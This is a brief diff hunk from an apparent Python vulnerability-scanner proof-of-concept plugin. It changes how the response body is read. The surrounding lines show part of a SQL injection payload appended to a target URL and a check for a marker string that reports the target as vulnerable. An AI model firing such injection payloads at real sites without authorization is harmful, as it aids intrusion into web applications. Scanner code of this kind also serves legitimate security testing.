@@ -53,7 +53,7 @@ class Poc(ABPoc):
                       '1,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,' \
                       '30,31,32,33,34,35,36,37,38,39,40,41,42%23'
 
-            content = requests.get(verify_url+payload).content
+            content = requests.get(verify_url+payload).text
             if 'f3c9f8ff331dab41a2363bca631e7aff' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
